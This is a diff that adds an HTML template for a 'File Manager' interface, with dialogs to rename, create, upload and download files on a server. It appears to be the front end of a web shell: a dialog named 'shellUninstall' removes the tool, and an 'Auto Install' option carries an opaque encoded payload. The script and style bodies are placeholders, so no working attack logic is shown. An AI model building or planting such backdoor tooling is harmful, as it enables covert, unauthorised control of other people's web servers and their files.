@@ -1,0 +1,26 @@
+<html>
+<head>
+  <meta charset='utf-8'>
+  <title>File Manager</title>
+  <meta name="description" content="File Manager || Made By Samiul Alim">
+  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10/dist/sweetalert2.all.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">	
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <style>|STYLE|<style>
+</head>
+<body>
+  <div id="body"></div><div id="loader"></div><div id="blur"></div><div id="viewFile"></div><div id="viewFileCode"></div>
+  <form method="POST" action="#" style="display: none;"><input type="text" name="data" value="Download"><input type="text" name="filePath" id="filePath" value=""><input type="submit" name="submit" id="downloadFile" value="Download"></form>
+  <div class="box" id="rename"><h1 class="title">Rename</h1><div class="input" id="newName"><div class="icon"><i class="fa-light fa-pen-to-square"></i></div><input type="text" id="input" placeholder=" "><label for="input" id="label">New Name</label><span></span></div><input type="hidden" id="renameDir" value=""><input type="hidden" id="oldName" value=""><div class="flex"><div class="button" id="renameCancel"><h1>Cancel</h1></div><div class="button" id="renameNow"><h1>Rename</h1></div></div></div>
+  <div class="box" id="newFile"><h1 class="title">New File</h1><div class="input" id="newFileName"><div class="icon"><i class="fa-light fa-file-plus"></i></div><input type="text" id="input" placeholder=" "><label for="input" id="label">File Name</label><span></span></div><div class="flex"><div class="button" id="newFileCancel"><h1>Cancel</h1></div><div class="button" id="newFileCreate"><h1>Create</h1></div></div></div>
+  <div class="box" id="newFolder"><h1 class="title">New Folder</h1><div class="input" id="newFolderName"><div class="icon"><i class="fa-light fa-folder-plus"></i></div><input type="text" id="input" placeholder=" "><label for="input" id="label">Folder Name</label><span></span></div><div class="flex"><div class="button" id="newFolderCancel"><h1>Cancel</h1></div><div class="button" id="newFolderCreate"><h1>Create</h1></div></div></div>
+  <div class="box" id="uploadFile"><h1 class="title">Upload File</h1><div class="input" id="fileUpload"><div class="icon"><i class="fa-light fa-file-arrow-up"></i></div><input type="file" id="choseFile" placeholder=" "><span></span></div><div class="flex" id="fileUploadBtn"><div class="button" id="uploadFileCancel"><h1>Cancel</h1></div><div class="button" id="uploadFileNow"><h1>Upload</h1></div></div><div id="progress"><div class="progressBar" style="width: 0%;"></div><h3 class="progressPer">0%</h3></div></div>
+  <div class="box" id="autoInstall"><h1 class="title">Auto Install</h1><div class="input" id="installAuto"><div class="icon"><i class="fa-light fa-shield-plus"></i></div><div class="select"> <select id="choseInstall">
+    <option value="Xl7aYCe71xQpV5SLG2KcqzQB+RwJPYIqsNOBF5ye13q4dxMJrrhvaNlhi2oP5VlGZGI6LyopycYB9x7l4sVO6gksxLW6dXXVhQW9or9h6SXaqgsqN8aZ0/5CF9R2jAGgpgbC3oxT1w==">Plupload</option>
+  </select></div><span></span></div><div class="flex" id="autoInstallBtn"><div class="button" id="autoInstallCancel"><h1>Cancel</h1></div><div class="button" id="autoInstallNow"><h1>Install</h1></div></div></div>
+  <div class="box" id="shellUninstall"><h1 class="title">File Manager<br>Version: 1.0</h1><div class="button" id="startUninstall"><h1>Uninstall</h1></div><div class="button" id="stopUninstall"><h1>Close</h1></div></div>
+  <script src="https://cdn.rawgit.com/ajaxorg/ace-builds/master/src-noconflict/ace.js" type="text/javascript" charset="utf-8"></script>
+  <script>|SCRIPT|</script>
+</body>
+</html>
